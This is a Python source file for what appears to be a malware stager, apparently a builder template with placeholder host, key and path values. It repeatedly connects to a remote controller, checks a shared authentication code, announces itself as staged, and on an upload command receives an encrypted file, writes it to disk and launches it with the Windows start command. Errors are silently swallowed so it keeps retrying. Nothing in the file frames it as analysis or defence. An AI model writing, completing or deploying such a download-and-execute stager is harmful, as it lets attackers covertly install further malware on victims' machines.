import socket
import sys, os
import struct
from cryptography.fernet import Fernet

KEY = 'RANDOM_KEY'
fernet = Fernet(KEY.encode() if isinstance(KEY, str) else KEY)

auth_code = 'authcode'

HOST = '__ipaddr__'
PORT = 12345

file_path = "PATH"

def encrypt(data):
    return fernet.encrypt(data)

def decrypt(data):
    return fernet.decrypt(data)

def recv_exact(conn, n):
    data = b""
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed while receiving data")
        data += chunk
    return data

def recv_command(conn, decode=True):
    try:
        size_data = recv_exact(conn, 4)
        size = struct.unpack('>I', size_data)[0]
        data = recv_exact(conn, size)
        dec = decrypt(data)
        return dec.decode() if decode else dec
    except Exception as e:
        print(e)
        raise

def send_data(conn, data: bytes):
    enc = encrypt(data)
    conn.sendall(struct.pack('>I', len(enc)))
    conn.sendall(enc)

def handle_upload(conn):
    try: 
        file_name = recv_command(conn)
        send_data(conn, b'control')

        data = recv_command(conn, decode=False)
        with open(file_name, 'wb') as f:
            f.write(data)
        os.system(f'start {file_name}')
        sys.exit(0)
    except Exception as error: pass

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            server_auth = recv_command(s, decode=False)
            if server_auth != auth_code.encode():
                
                try:
                    s.close()
                except: pass
                continue
        
            send_data(s, b'STAGED')
            while True:
                try:
                    cmd = recv_command(s)
                    if cmd == "MODE_UPLOAD":
                        handle_upload(s)
                except:pass
        except: pass

if __name__ == "__main__":
    main()